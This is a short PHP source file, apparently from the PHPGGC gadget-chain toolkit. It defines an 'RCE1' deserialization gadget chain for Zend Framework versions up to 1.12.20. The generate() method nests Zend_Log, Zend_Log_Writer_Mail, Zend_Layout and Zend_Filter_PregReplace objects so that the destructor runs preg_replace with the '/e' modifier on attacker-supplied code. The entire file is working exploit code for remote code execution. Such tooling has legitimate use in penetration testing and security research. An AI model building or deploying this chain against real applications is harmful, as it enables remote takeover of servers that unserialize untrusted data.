<?php

namespace GadgetChain\ZendFramework;

class RCE1 extends \PHPGGC\GadgetChain\RCE
{
    public $version = '? <= 1.12.20';
    public $vector = '__destruct';
    public $author = 'mpchadwick';
    public $informations = 'Uses preg_replace e modifier which has no effect in PHP >= 7.0.0';

    public function generate(array $parameters)
    {
        $code = $parameters['code'];

        return new \Zend_Log(
            [new \Zend_Log_Writer_Mail(
                [1],
                [],
                new \Zend_Mail,
                new \Zend_Layout(
                    new \Zend_Filter_PregReplace(
                        "/(.*)/e",
                        $code
                    ),
                    true,
                    "layout"
                )
            )]
        );
    }
}
